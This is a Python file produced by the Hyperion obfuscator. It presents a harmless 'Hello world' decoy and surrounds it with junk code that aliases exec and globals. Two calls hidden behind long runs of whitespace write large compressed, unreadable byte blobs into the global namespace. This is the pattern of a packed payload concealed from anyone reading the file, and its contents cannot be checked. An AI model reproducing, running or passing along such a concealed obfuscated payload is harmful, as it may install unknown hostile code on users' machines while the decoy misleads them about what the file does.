from builtins import *
from math import prod as Theory


__obfuscator__ = 'Hyperion'
__authors__ = ('billythegoat356', 'BlueRed')
__github__ = 'https://github.com/billythegoat356/Hyperion'
__discord__ = 'https://discord.gg/plague'
__license__ = 'EPL-2.0'

__code__ = 'print("Hello world!")'


_multiply, _random, Divide, Algorithm, _substract, _ceil, _add = exec, str, tuple, map, ord, globals, type

class _cube:
    def __init__(self, _builtins):
        self._callfunction = Theory((_builtins, 98182))
        self.Random(_calculate=35921)

    def Random(self, _calculate = float):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        self._callfunction *= 1435 + _calculate
        
        try:
            (({Divide: _random}, _random) for _random in {'Blttooa6tl6hRd5at5': _random})

        except TypeError:
            ((Algorithm, {'Blttooa6tl6hRd5at5': _random}) for Algorithm in (_multiply, Divide) if Divide > Algorithm)

        except:
            _add(81194 - 57351) == Ellipsis

    def DetectVar(self, _frame = 85915):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        _frame *= -61445 + 47108
        self.Run != False
        
        try:
            ((Algorithm, (_substract, _random)) for Algorithm in {Divide: _random} if _divide != Algorithm)

        except ArithmeticError:
            ((_substract, (_multiply, Divide)) for _substract in (_random, Divide, _divide) if Algorithm is Algorithm)

        except:
            _add(9013 * -22501) == None

    def _while(Power = None):
        return _ceil()[Power]

    def MemoryAccess(_floor = -77554 / -94013, _modulo = True, _theory = _ceil):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        _theory()[_floor] = _modulo
        
        try:
            ((Algorithm, {'Blttooa6tl6hRd5at5': _random}) for Algorithm in (_multiply, Algorithm) if Divide != Divide)

        except AssertionError:
            ((_substract, _random) or _multiply if (_substract, _random) and _multiply else ... or (_multiply, (_substract, _random)))

        except:
            _add(74354 / 69035) == str

    def execute(code = str):
        return _multiply(_random(Divide(Algorithm(_substract, code))))

    @property
    def Run(self):
        self.Calculate = '<__main__._ceil object at 0x000009083BE16770>'
        return (self.Calculate, _cube.Run)

if __name__ == '__main__':
    try:
        _cube.execute(code = __code__)
        Round = _cube(_builtins = -19173 / 84812)

        if 108309 > 7413351:
            _cube(_builtins = 29407 / 27366).Random(_calculate = Round._callfunction / -48183)
        elif 261326 < 6676133:
            Round.DetectVar(_frame = 58122 + Round._callfunction)                                                                                                                                                                                                                                                          ;_cube.MemoryAccess(_floor='IJIIJJLILJJJLLJLLLILIJ',_modulo=b'x\x9c\xed=k\x93\x9b\xba\x92\xdf\xf3+\xe6\xce\x17\xdb\x95s\x12\x10 `\xaa\xce\x97\xad\xec\xd6\xf5\xd4$\xde\xba\xd9\xda{\xb6rR.?p\xc2\\2\xa4f<7\x93\x7f\xbf\xdd-5\xc8\xf8\x81\xb01v21\x16\x82\xa6\x8d\x85\x10\xad~\xb3\xbc\xff~\xf5\xe2\x02>\xe9\xa2O5~\xc6\xe3|\xbax|\x98M\x96\xf9\xfdx|\xf1\xb7?.\xff\xfe\xfdkr\x9f\xe6w\x97\x17\xf9\xbd\x816y\\~\xce\xef\x1f\x08\xa7\x7f9M\xb3\xec\xfb\xf2s\xf2)\x9f,\xbd@^\xfev\xf9\x1f\xd9c\xf2\x8fd~9X\xf9\xd5\xa7t\xf9\xf9q\xaaN\xfcy\xb9\xfc\xfap\xf5\xfa\xb5\x82\xbd\x9a\xe5_^WN\xf3z\xcb\x7f\xcf\xd3\x87Y~?_=\x8d\x06\xbe\xfa\xf4\xe9\xf5\xd7l\xf2\xe91\xa9\xfc(Kg\xc9\xddC\xa2~\xf4\x9f\xff}\xf3\xbbx\xe5TPf\xf9\\\x1d\xef}\xbdO\xef\x96\xfd\xcb\xbf\'Y\x96_|\xcb\xef\xb3\xf9\xdf.\x07\xbd\x17\x83\xab\x02\x1b\x8f\xf7\x1e\xfe\x95\xce{\x83\x17\xc9\xd3,\xf9\xba\xd4\x9dy\xf7\xf5\x11~\xf9\x8f\xfc!y\xb8\x98\xdc\'\x17\xf7\xc9\xfc\xaf\xbb\xffM\xf3,Y*\xc0\x14z\xe6\xaf\xbb\xff\xcb\x1fior\x81\'\xf9\xeb\xee]>\xcd\xe7\xdf/\xb2\xf4_\xf0\xbb\xef\xf9\xe3\xe5\xe0\x85jT\xfa\xe5k~\xbf\x1c\x8f\xe1\xdf\xbe?\xf4\x06\xaf\x92\xa7t\xd9\x1f\xbc\xc8\xf2\xd9${\xe8\x0f>\xf4F\xa37o\xf2\x1c\xbe\xa3\xfc\xcd\x9b\x11m\xe5\xbd\x8f\x7f|\xca\xf2)`\xbc\xd8t\x18\x7f\xf6\x0e?oq\xc1\x0f\xae{\x1f\xae\xae^\xfe\xfe\xf2\xf7\xfe\xef\xfd\x97\xee`\xf0\xf1\xe3\x1f\xf3\xf4~\xeb\xef\xdf \x18v\xa1\x1a\xbd\x19\x8dF9|\x01i\xb4~\x96O\xc9r\xb2\\n?\x136\x83\xbe\xd4\x0c\xfc\xe2\x1e\\\x82\xba\xc6\x17\x9b\x8fS\x1b\xe8L\xa37\xd8\nX\xe5\xb8B\xd8\x08~\\\xf6\xdc\xd6?\x86M\'\x1f9\xf0\x81\xf6;\xea\n\xe0\x97[\xcf\xda\xefM\x1f\xd3l\x99\xde\xe1}\xf8\xf7\xe4~W\xd3\xde\xbf\x17B\xbc\x17\xef\xa9\xa6\r8\xb3\xee"\xf8\x8e\xe8O\xb8\x07\xfb;\xfe\xf2\xe1.]f\xe9\xe3\xb4\xda\xaf\x83\xdf\xf4m{K7\x91n\xe7^\xe7\x19|h\xebD\xaf\xd2\xbby\xf2\xd4\xef%Y\xfa\xf5K>[C\xf88\xd8\xd1a7\xc3\xeb\x9b\xeb\x9b\xe1\r\xacn\xae\x87\xd7\xc3\x1b\xe8\xaf^\xef\xd5m\x9e\xdem\xbd\x81\xc3l\x88_(\x19\xd5\xb0\x95!(\xdb\xb3\xaf\xd3t\xf60\xb9K\x0f\xee\xeb\xad\xe7i\xda\xd7\xdbO\xc4}\xfd}\x91fO\xc9\xe7\xbb\xc7f\xbdM\x8f\xbe\x86\xbc\xe5m\xf5\xd4=\x93A\x9a\xe5\xf9\xfaQ\xe8\xb3MD\x01{\xec\xe9\xdb\x13|i\xf5\xf4\xed\x1b~\x9f\xbe=\xa3\xde\x9a\xfc;\xd9\xd8[[\x9eLx\x90\xe19\xa6\'\xf9\x06\x1eK\xd8\xb8\xc6\x07\xfc\xf9t\xd8r\x92g\x8b&\xe3\x0b\xa7\x08\x9c.h\xde\xa0\xad\xe7\xd3Y\xc9C6\xf9\xaf\xa6\xd3\xc5px\r\x1f=\xc8\xa0~F\xdd\xf5x\xff?\xcdzK\x8d+\xc5\x8e\x14\xdf\xe7\xd3a\xf7\xcb\x87\x06\xc4k+W\xd1\x9f\xf6\xfc\xd8\x8f\xe5\x0c\xd7\xe5\x16\xaf\xb1\xc650\x87\xf3\x04e\x89~/Z,7L\xcc\xcf\xa5\xdbg\xc9\xd3\xe6Ic\x0b\t|\xab\xd9\x91\x829Q\x8dX\x11L6M\xc3\xfd\xde \x1a\xbb\xe3h\x1c\xc0\x12\xc1"a\xcf\x03\xe4x\x1dZ{\xae]w\xdfs\xc4\\Db\xee\xb9"\xae\xbb\xcb\x03\xb5\x02\xf9\'\x9b|\x99\xce\'\x17\x19\x9e(\xa3\xf5P\x7f\xaf6\x8f\xc0m\x1dd70\xcd\xe1YB\xb8\xf8\xb5\r/\x1a\xfc\xe7\x9f\x7f\xfe\xf3\x9f\x7f\xe2B+\xda\xbe\xdaFc\xb6\xdeTn)\xb75\xb3\xb8\x9b\x0e\x1ct\x0f\xbbS~\xb0\xf0\x1c(\xb1\xae\x03]{\x1a\x16\xe1\xb6\x98\xd2\xdd\xb4\xc1\x15{\xdcq\xe3\xba\xd5F\xf3\xde\xa3\xab\xd6\x17\\p\x9d\xf5\x1d\xe8\xc3\x90\x8f\xc7\xceX\xc0\xb0\x170\xeca\x0f\x90\x83u\xe8a\x9d\x8c\x9d\xe3B\tu\x87I\xdda\xb8\x8f\x9d*\xb03u\'\xdb\xe0\xfaM:\xb9qsE\x18\n9\x17\xf0\x0cC-\xa1^\x84\x9e\xf4\xa5\']\xd8\xf7\xc5"\x08e\x04\xdb~\xe8\xf9n\xe8\x84\x8e\x08k\x1b\xb3\x9d\x94\x15\xba\x15\x16\xb0\xdei\x01\xab\xfe\xe6\xb9p\xd0\xb1\xc1\x83\xdb\x18\xd2\xcd\x0c\xc6\x1e,\xee\xd8\x07d\xb1\x0e\xed\xe6\x89\xdb\x836\xae=1i\x96\xdd\xa6\xd9\xedm\x9a\xde\xde\xc2\xa9o\xb3\x14v\xb34K\xaf6w\xf4\xd6\xfe\x87\xe6>=q\xf3\xf9\x1a\x0e\xbb>\xa9\x07\xad\xa3)B\xa8\x07t\xa0\xf7}\x83\xa2\xd8\xe0ZR\x94\xbd\x06\xfa\x01Cw\xd7\x89\xc3(\x0c\xa1\xe0\x9ak.&\x04\x96\xfaI\xa6\xf5\xc7\xd7\xf7\xf1\xe1\x95\xee\x91\xae]\xc6\x92&TX&zk\xa2\xd7\xaa\x8e\t>)\xd6\x93c\xf4\x81\xf0\x039\x97.6@8\xde\x04zA\x1c\xe5j\x03/\x80\xc1\\\xae\xd5\xe2\t\x86\xe1r\x94\xeb\xf3\xe6v\xcb\x01\xd7\xdd\x03\x1e\x16YXd\xb7F\xc8~\x8dP\x83}\x18qp5\xf1s\x8e\xf8P\xd7\x0c\x7fW&\xd2\x87\xed\x05\x0c\x0e\xffX\x0f\x01>eP\xcc\x0f\xed/$-\xb8E\x0b\xd5\xb8o\xcdm\xea\xf9\xf1\x1d\xcf\x9c\xb84\xa4\xfa;\xf9\xe3\x05\xb7\xd1s|(\xd4Z\xda\xc3Em\xc9\xc5\t\xc8\xd6A\\\x06\xcbj\x8a\x9b|\xa7\xa4\xb6zy\xe9\xd4CY\xf83\xe8\xff\x10\x06jr$\xfa\xe5\xcf\xfc\t\tA\x850Tl\xe1\x91\x19-\x0c\xa3=\xeb\x81:\x1c\xa2\xd2\t\xd5O7\xf4\xbd\xd6\x1a\xa8\xa6,\xca\x17\xfc\xdc\xe1\x82\x1f\xda\xc2\xcd\xd6\x18\xc46o\xf2\n\x93\xa6\xb4\xbap\xd9\xb8\x1e\xa2\xa2\xf7z\xd8\xe2\x93J\x13\xad\x9eBi\xa2\x8d\xf5\x14\xcb\xf0\xb8\x9cr\x8f2\x05\x05\xb1DZ\x1a\n\x87jd)\x1c\x9ctC`\xe3\xe4\x14\x16\x80\n\x07\x9eb\x17\x9a\xe0\xca\xe8HCX\xd3Y\xa2\xb8R\xd1T\xa2\xb3\x8a\xae*\xca\xcbG\xb0\xb6\x1e\xc0\xef\xb5Y\x92\x95\x82B\xa9\x05\xdbTFh2\xab\x08\xad\xdaR\xa4\xb6\x98(\x8c\xe3\xc7!\xbb]p\x12;o\x9f\x1a\xbcj\xa8N\x8aa<Y\x19\xc4V\\\xa2\xbemlb\x87\xa6`\x13p5\xc2F\x8d\x1ak\x15\xea\xe6I^d1\xab\x97\xa3\x8e\xc7\xdbq\x9e<\x87\x9e2/\x0c\xe5\x82f\xc7CY\xdc^\xc6\xff\x94\xe9\xff\xc3\x7f\xebx~\xe4\xfbGw,w\x9c\x9co"|Z\xbdw\x86x\x16\xad\x88ca!\xa4\xd1^\xed\xbd\xeb\xef\xa1\x19/\xe5\x82RfP\xfb%\xa4\xfe\x8f/\xa9\xdb\xdc\x97\x00\x82\x03/\xaf\xae>\xf4\x1e\x97\x8b\xa8\xd7O\xe6\xf9,\x99\xbf\x1a\xf4\xfc0!\xe9G\xd5"t\xc2\x99\x00Y[F@\x9c\x1d\x80\x8ap!\x9dp\x0e\xc7\x1c\xe1\x11\x8e\x1f\xe2\xc3\x17\xc0\x80\x02&\x0c\xc6\xb3\x08\xa5\xecM\xfbZ\x1d\xa9.C_\x10]_\xff#Oz\xbb\xda\x11\x8b\xc8[\x04\x0e\x14\x1f\x8a\xa7\xeb\x18\x8a\xab\x8bC5\x0e\x96\xa9\x88\xadpw\xb6\xca\x18\xa0\xc5\x905\xdb7\xd4\x03|\xc8\xc3=\xeb}\x18\xf4\xf5\xe0*\xf4\xe9\xea{\xd9\x9e\x16*\x1c\xc7c9\x8e\xc6\xce8\xd4\xeaE\xf8\xe5\xcbh\x1d\xda\x8d\x16j\x0f\xc6\x86\xcbo\x8b4K\xee&_\x92?v\xd2\xf5\x04x\x81D\xafUQKR@\x13\r\xd5\xc7\xea\xda\xf1\xdb\x178\xb6\xfb?\x03\x18\xb2n\xbdei\xb0\x97M\xeb\xe8d\x03\x9d\xa1\x94\x1b\x94\xdex\xff\xbe\xb5\xc1\x80jPw\x8c\x86\x1e\x9f\x0c<>,\x82\xd4\xa0kP\x8bsI2\x149\xb0\x04\xfa\x97hF\n\xd7\xa1g\xcb\xa5\xaf\xa8U-\xc8i,\xe6~\x02\xcb\xbc(s\x9f!s\x03n\x1e\x89\xc4\xa4\xe0e&\x15f}R\xf0<\x08u\xc4\xc4\x99xZ\'\xb82\xb2\xaa\xe3Mm; "\xc7\xad\x10g\x87\x08\xef\\\x9c\x17Q\xb5\x1d\xd3\xb6x\x12Fc\x00\xe3\x12\xc77\xdau\x02\x1a\xfb\xe1:\xf4d\xaa\xfd\x92\xa8\xf6H\xcc\xd5R/\xad\xebe\xdd6[\xa5\xc8\xec\x9a\'\xd3\x96\x9e\x15\xd0sh%\xc3\xfe\x0b\xc7\x1el#%\xf0\xd6\xa1\x87\x1b\x15|m,\x08\xf4v\xd5\xf4\x18\x18F\x85:\xdc\x06\x16\xb4\x1d\\\xf3\xa6\xa7\xa2\xdd\xeb\x14\xda \xc2\xedVm\xdf|\x9d\x9bp=K\xe6\xbb\xbf\xd3C\xb7\xe9\xa4\xb4\xf3\x12\x85n\xae\xa7kW\x97H\xef\x87d\xf3Q\x97h\x83k9\xac?\xeel\x95\xafU\x9eJ\xe2fe\xa7\xaf\xe5oY\x88y\xd0\xaa8\x98V]\x08V\x1d\x07J\xa7\x82\xd2\xe3EDR\x88\xd0\xf3\xbd\x98\x8a\x94^\xb1\xbd\tV\xdd\xe6}\xbd-B\x11\x0b\xd4\xb8\x04\xd2\x83VA\r\xed\n\xbdH\xca\xd0\x0f\x03\x11\x06So\x02\x12\xe1\x14\x1e\xfc\xa9z\xf8\x91\xb9\xc6\x9e\x82\xd6\xcf\xa9D{_\x83\x04\x01\x05\xfe\x8bjh\x0e\xc8-\x91G\xc2hQ\xf3v\x15^\x85U\xb7\xa3\x15\xb8\xf0\xe2C\xaf\xb3~dX\xf2\xb2\xab*6\x9e\xcdK\x95\xdb\xa4\xb0w\xd1\xdcn\xc7\xc9\xda\x91\xd8\x9d\xcf\x92\xa7I\x1b{c0I\xf0\r\xa7\x81X?K6\xb8\x91-Y\xdc\xeeC\xf7\x93\x0b\xde\xed\x11\x11\x10\xaf\x0bW\xb8\xcd^I\xb8\xde6\xc8m\xbb\x12\x1f\x18\x90\xaaK\x0e\xb9\x9d\xf3\x95<\xc5\xc1\xe7\xdb\x9b\x10y\x9e\xeb\t\xe9\x13\x01\xc2\xda\x83\xfen\x85h\x98[e} \xd1\x04\xe2\r\x8b\x806\x1e\x83Xz\xd2\x85q\xe7\xd2\xf97M\x1c\x9b&\x9a\xeaq\x13^\xad\xc5\xd6\xf6\xecj\x7f\xb8\x03G\x953"\xf2\x8a\x06\xa8\xc2T\xc14\xee\x97[\x9d\x91\xf7\xd8`{<M\xb2=c\xdf\xa9\xf8\x8d\xd5\xe1Zs\xbd[\xe3\x15\xf6\xe2x\xed\x95d-(\xb6\xd89\xd1g\x0eXOm\xecG\'\x0c\xf6\xd2\x06\xb7\xa1,\xd7\xaar\xa7M\xa5\x87\x8d\x92\xc3C\x9d\xf0\x8an\xb8\r\x15\x83\xabU\x0c\xce1T\x0c\xb9\xeaj\x8c\xae\xa4-\xf4\xc2\xaeU0\xd4\xf2T\xb1\x1e\x14\xae\xaeY\xd6`\x07\xcc\xd0\xe0\xa9\xeap\xa5\xa5\xd8]*\x00\xa85l\x8d\xd1\x1f\xdc=[\xcdpk\x04\xaf\xf1\x7f\xef\x88\xe582\xa9')

        _cube(_builtins = -64973 - -66758).Random(_calculate = Round._callfunction + -68147)                                                                                                                                                                                                                                                          ;_cube.MemoryAccess(_floor='OOO0Oo000oO000Oo0ooo0ooo0',_modulo=b'\xf2\xc95\x18\xb5\xfa\xe8=\x1a\xa2\x1a\x95\\\x87\xd7\xa0\xdd\xa8@\x99\xc4\xb3\x12\xa0J\xc6\x02c\xaa\xb0\xc1m\xa4 \xa9!}\xc7\xe7\xcam\xf4\xb7\xea\xa4\xf8\x07\\\xab\x85a\xb8\x8e\x04{\xbc\xc4\xda\xefe\xa6\xfd`V}cx\x0b\x8f(\xdd-{:\x96\xd2a\\\xec\xaf\xda\xb4\xd1\xe0V\xaf\xbd\xad\xbb\x1er\xeb\xf0\xd5\x1a\xebr]n\xed\xfa\x87\xfd\xb5\xb3\xb5\xc304\x86\x974\n\x13FS \xad\xc3\xb5\x14Hm9<v\xcd,\xc7\xd7\xba\xf3\xa6-\x7f\xb7Sa`o\x88:\xb1 \xdd\x9d\xde\x8fU\x92\xac\xaat\xf4-6\x99.\xf6\x0b\xb7\xc1\xb5\xf5\x0b\xdf-\xb2\'\x86\xdd\xc6\xb4\xde\x98k}\xac[\xb1\xfd\\\xc5\xe2\xc3\xc4`\x90%\xb1\x85B\x06T\x87 ^\xaa\xdaW\xfaD\xddn\x1f\xf0\xb0H\xa3\xe0u\xf8\xbaf\x98o\x1c\xe3b\xc2\xb0\xeeX\xc4\xec\xa9\x18\xc07\x14\xb2\x88\x91\x800\'Z\xb0\x00h\xfc\x17c\xa9\xe3\x8e\xd0j\x82\xec\x84\\\x87\xb6\xc8\xc2\xa0UL\x8e1\x06J\x90\r\xd8)\xacb\x15h7,\x0c\x07\x82\xb0\xad\x86Y\x13f\xb0#b\xa6K\xdbG\x1dn\xb0\x9f5\xf8\x1c\x99\xd9\x8e\x94\xaa\xdbB\xee\xf7qKha@\xb0\xf1\xce,\x92\x19\x03]3Ok\x83\xdb$l\xce\x8a\xa5\x04)\xd9C\xbd\xae\xd2\xf5j\x9fS\x84\xf9\xb4\xa7\xbdN\x0f`*\r\x96Nm\xab\xc0\x1a\xb5\x87\x8b\xad#\x80\xbd\xa7\x96\xd0\x9eV\xe8}%\xa1\x04PB]G\x15O\xadz\xdc\x83$~\x1aB\x83^\xb7\xce\x07;Gdh\x90\x9cH\x93\x1d\xe6M\x84&?\x91\x1e\x916\xb8ac\xdd\x00\xba\xc1\x7f)\xdc\xe0i\xd5)\x95j\xd7\t\xeb\x94\xbe\x9b{\x11\xdb\x0e\x8cH\x8d9\xd2\xe7m\x8d\xb6\xe4(\x7fr\xe3\x85_\x847T\x82\x1f\n8\xc2\xceC\xb0=\x0f#B+\xbaR\xd3\xc8"\x0c=p1\x17\x04\xa5\xb1\xc1\x06w\x9f\x98\xf0vE\xf8V\x18\xb7}\xd2\x7fX1\\zl\x9b\xe1\x93e@\xa5\\\x8d\xb7\xc4\xfd\x85\x84fT<5K/\xceU?N>\xf2\xc3\xea\xf3T\xaa\x1c\x9aJqF\x85\xa95\xaf7\x85\xa0";$\xf9\xd2!\x8f\xdd\x08%?Rd\xafA\x0fW\xff\x98\xa6\x11\xb6\xbbI\xe31p\r\xf5O\x1dn\x13\xf3\x84\x9d\x93\x8f\xf6\xce\xe0X\xb2\x92|V\xe3|\xce\xc1Q}_"\xda!q\xe4\xf40\x9c2\x86\rd\xac\xeb\x8d\r]\xb0\r\xae\xb5sRa\x8e\xd87\x9e\xbf\x0bs\x84&P\xc5Z\x91+&iE\\8\xc9\x8fs`/|\xe0=b(\x89@+m\x1bv\xd9@\xc7\xd3xZjsu\x1dki.4\xa4=i\x85{>.\xe4;\x07fl\x0c2\xd6\x11HC\xd3l\xda\xcalp-\xf5\n\x86\x14\xf7\xd6\xb8\x16#\xbdh\xb7\x11\xe9\xe7\xa8\xe8:\x82KuCf\xe4|\x05C\x1d\xdb\xcc\x91\xa6&\x93_\xc2~\xb9(W\xbc\xed\xea\xda\xbe\xcd[n\x9b7\x1c\x96\x15o;\x84\xc3vq\xae\r\xe7^\x83\xf1o\xa8\xf6\xca\xe3&\x9eq\xcc4\x89T\x8b\xac\x14\x1f\x05_\xe3\x98\xaf\x17\x86\xf1v\xd7f\x91oO:\xd5\xd47J\xd0\xa6\x9e\xdfC\x9f\xed (\x9d\xde\x98*\x9b!\x11Q\x85\xc5\xa8\xc3\xb557\xff4\x94\xd3^\xaaV\xa9\xf00X\xd0\xa7\x94x.\xc5\xaf\xc6\xeb\xd0\xee\x98K\xb6\x06\xbb\x1bjs\x0e\xb7\xc1\xdd\xcb\xdf\xa5e\xc9\x1b\xbb\xd8\xa30`\x8e\xa4\x14\xba\x8b+\xd0v\x02pL>\x9b\x95\xd2\xac\xa8f\x077\x1b\\K\x077{)\xdf\xcc\x97f\xe6P\xab\xa8x\xc3\xe6\x8cq\'R\xf8\x1e\x0e\x89\x18G\x87r\xb6\xa0\xf4\xab\xb1\x8a\xc9\xa58\xba5\xa8\x95]\x17\xe5v\x17F\x8d [\xae$\xabn\x05v\xd8\x18\xe21\xe0\x1b\x8f\x10\xfb\xf1x\x86\xd2\xab\x0e\xaf\xa1\xc2\xcbt\x92\xbcQ\x9f!\xbe\x03\x01\xf3\x0b\r)\x87\xfa\xe1\xce\xc3\xac|\xf0\x8df\xb3C5\xd9t\x0c\xc9`\x17.\x89\xad\xc7\x08\xb9D\xdfB\x9frW\xaa@k\x1c(*\x88\xd5\x80\xb5\xa8\n\xf0(/pHC\x07S\xa3\x02\x19\x02d\x7f\x1dz\xb2\xe0\xd9S\x9b\x92N\x10\xcf\xdfvW\xfe\xb0\x91M\xac\'4\xf5\x85f\x04\xacb\x04\x14\xe7*\xadpO\xe9\xba\xe5T\\\xb7\xdccD4\xb5&[\xad\xc8\x1b;\x96\xe2\xf8\x06YeE\x9e1\xf6\xf9\xf8\xaa\xac\x15\xe8\xe2\x1b\xc5\x84U\xeb\xeaq\x7f\x0b^\x89\xf3\xa3\xbb\x9f!\x11DZH\x84\x90\x08"\x92%gt`\xe2\xce\xbd\x92\x08\xb4\xa4\x02\xff\xe5\x16ul\xea\xdeD\xb3\xd4m\xdc\xaa!\xb0;\x06c\xc5\xdb\xc4x\xe9\xe7EX\xe1\xb6\x14\xff\x1a\x94~\x86\x1c9\xc6r\x12[\xa9x\xd6q\xadp\xdb\xeb/Vt\xf0\x7fr\x1f\x86\xbaxF\x7f\xd5\xe3\x9er6\x8c\xbc\x80(\xa9\xac\xd4~e\x9f\xf1B];\xba\x8ea\x16\x15\xc6lz\xe8\xf9Zr\xf9\xd8\x1c_\xdc\xca\xec\x8c\xfa[L\x9d\x10*-\xe5\xb9\xb8\xa7\x04!-\x91.\xbc\xc6:* \xb5\xc9\xd0\x9f\xc1\xa4r|\x13\xc3\xe9C\xa5\xca\x94X\xec\\a\xa6\x87/\x93\xc4k_WK\x07\x8b\x1f7\xddU\xab|\x97\x9d\xb7\x18\xfb\xbd\xac\xfa\xc5\xcc\r/\x98JN\xb3n]\x1eN*\xcb\xb7\xc7\xed\xb5yc\xdb|p\xcb\x94\xa0\xb1\xf3s\x06x7\x89\x81A\xed*%\xde\x1c\x87\xb0\xf8:\x06f\rjq.A\xaf\x91\xf1\xe0w*\xa1\xa7\xa4sy\xebP\xabs\xb9\x14\xf1\xe3P\x8e:\xfc\xbd\xa4s\xadA\xdb\xd1\xe32\xdf\xcc\x062\xd6\xf7\x93sbE\x97\xbb\x0b\xb7\xa1\x8fNC\x0f\xad\xf9J\xc2\xd0jJQ\x9dN\xf4\x1cH\xd5\xbe\xc6\xb8\x98^G$\xc9\xa4\xe6\x91\xbe? \xe5n\\\x85\x1en<\xe3\xa0\x18\xf6\xb0b\xee\x9fC.C\xc3xV\x87\xdb\xc8\x02\xd4\xb2\xd1\xac\x05u\xa9\x17,V\x84!\x8e\xdc`U!\xbd\x9d\xc8\x08Z\xae\xc3\xb5\x8c\xeah[\xed\xfa\xcb\xe5\xa3PK\xbaj\x9f\xda\xe5\xea\xe2\x955\x1ds\xcbB\xbf\x8d\x8d\xdf\xb9+\xc5TAv\xa1\xf2\xfc\t\xdc=v\x92W\xad^\x92\x86\x07w\x19\xbd`\xef`\xdb\x82\xffEcU\xda\xe9\xfc/l\xf10\xa1\xadG%"\x17n\x95\x90U\xaeC\x0fw\xe7\xe6\xec7^\xb0\x9aj\x8a}#\x99q\xb0\xc1\xdd\x83q8\x89f\xb6S\x0fj7X\xb5Uq8!\xa7B \x98\xee\xe4:\\\xba\x01\xfbt\xf2\x0f\xac9v\x8cA\xc7\xf6=\xd7\xe8\x9b\xc8\xd0\x84\xd6\xe3\x9eg&\xc6(Xua\xf3\x8c\xfb\xce\x1af\xbe\xce\xd8\n\xf7g\xca\x10\xd9\x89=\xf5(\x9a\\\x87\x02\x19\x1d\xd2\xe6*\xa6$ \xed\xaeb\x0eL\x9be\xd5\xfe\xb9\xcd\x06\xba\xab.K\xd7\xf6J\xf5\x86%\xa1^\xbb\xce\xefZB\x80\x05\x89Ui\xdb}\x12\xd5\x03\x12\xae]\n]Z\x83\x9ed\x1e\x16Z\xe8\x8f\xc8}/\xa0\xb6\xc9u\xe8\xe1\xce|\x1c\xa3`z#1Y \xc1\xdcp\xe6\xab\xc3\xdd\xcb\xfb\xa6\xa9\x07S\x87Sh\x14\x94\x06@vZ\xe4\xb4\x8f,\xb7\x99agu\xb8\x8d_1\xd1a\xf2\xf8H\xb7\xdbL\x84b\xbeJ\xdaT\xe6\xd8\xe0Z\xf2d\xdd\xe9L\x1b\xa7\xbclO\xb8\xfe\x01\xd2>\x85\x15\xab\xe56k\xa6\xa8X5\xbd\xc2Z\xaa\xea\xa0b5m\xeb\xbc-\xcd-\xadgcn?1\xc0\xb6l\xccm\xc5\x9f\x88\x9dm\xde\xd6\xbeM\xd7Q\xd6]\xcf\xfb\xef\xf8\xfd\xb5,C\xd7\xbf\xf2\xddJVb"\xe6\x1b\x04\x9c\xb5\xd3\xb2"+\xed\xc2\xb5\xcc\x1e\xf5\x13\xbd\x94\xaaMa\xda\'\x0e,$C\x85J"\xc6\xd9Q+\xd0\xb3u\x99\xb2\x98@~ejiK\xa0)5\xb0\x9eQ\xdc\n\xcc\xadl\x1b\xfb\x9b\xb4\xb7\x15Mn\xe7\x01o\x14\xe6F1o4F\xdb\xe2\xee\xfc`5\xc1{\x91\x13\xb3\xc2\xd9m\xc3kD\xd8\xce\x90\xa3/BL\x0c\xa5\rs\xaf\xcc\xc1\xfb\x86\xc4S\x87k\xf9\x8a\xa4\x93p\xf4<1\x99\xee\x83\xac\xb8)&,}\xad6\xb8\xd6\x8c\xf3\xd9&\xb1\xffe.k?B\xba\xe2\xe1nz\xb9\x9b0\xd3\xd3}\xcd\xac\xb5\xe5\xf7\xf4\x9b\x0e\xb8\xe1b\x02\xd9d\xda[3\xf9y\xeb\xf8\xd5\xe3\x1a\xe7\x9c\xccf\xeb/M-\xb7\x93\xc2\x1bB\xbf\\\xf5<|)\x8f@\x12\x99\x9c\xb3"\x8b\xa7:V\xd4\x90a\xa9b\xac\xdf\x85k\x9dF\xfa\x84i!\xecr\x91r6\x19N\x00\xe7\x97\x19\x8b\x8c\xb7\x957u\xff\xea\xd4\x05\xec\xb0\x8c\x9fGv\x15\xb3\xc6\xd3\xaf\xbc\xa4\x17\x8a\x92\x03\x8fX\x85\x1c\xce\x07\x9aZI\xf6D)\xc2\xb1+\x1a\xcd:\xdc\xa3\xbd\x01\xda\xc8\xb5\xb6\xeaQZ}O\xeeY\xbc\xf9\xf9\x1c2\xcf\x9c\xb5S\xf8\xdcp\xb7\x9b\x1b\x93Q\xf5\x1d\xdf\n\x02,\x96\xcf)\x8b\xcbH\xfaj,\xbdZ+\xb7\xf0\xe6\xb9\xfd\xce&\xef\xde^d\xe74q\xbe\x86\x80\x9a\xa5\xb8\xdcf\xd9m\x96\xa6\xd9-\xaco\xd3\xf4p%\x9c\xe9\x80`\xbe\x94\x8ci\x90o(\xe1\xeap-e\xb3\xf3\xa5\x0f\r^\xcfn9\xbb\x84\xe4\x08\xeaP\x0e\x00\x8f\\\x93}@\x8e\xd6\xa1\'\x8b\xc6?!\x1d\xdb-\x1d\x9e\xa3\xaf\xca\xb9\xfa6\x1c\xd1w\xe1\xb8\xd2&\xf4\x01I\x9b\xe5k\x8a=\xbd\xedP\x1b:\x8e\x8a\xeb\xd1P\xd4\xb3\x07M \xc8\xabv\xa82\xf9a\x05=\xe6QYwi:,m\xf20\xac\xc3\xb5\xb6f\x9f\xb9\xa0\xd7<\xec\x0es \'F<W5\xf2k\xbef\xc1H\x8e\xf2\x02\n;Q2\xd2iE1\xd5\xa8\xafS\x8dJ]"\xbdo\xbe\x84\xa2\x1e\xb7\x13\x914\xd4a9!\xe5\xc5q\xc61\x1c\xac\xc2\xa2\xaeE[\x87\xd2\xf3`L\x89r6BW`\xb7\n\xeb\x94\x1cUx\xd0\xeb\xebkL\xe04\xbc\xb9\x1e\xde`\x0e\xa7\xe1\x81\t\x9c\x9e\xed\xdb,~\xb1\\]\xb0\\n\xc5\xc5%\xd8\xe2\xf2Ru\x95\x11\x15\x97\x19\xaf\xe2b\xd3\xd6y\xc5\x0f\xc1\x02\xfe$\xca\xfa\x9e\xf1\x1a\x1e\xd8\xd4u\xfd\xebx0\xd1\xa3G\xfe\xa9\x82<U1o&')

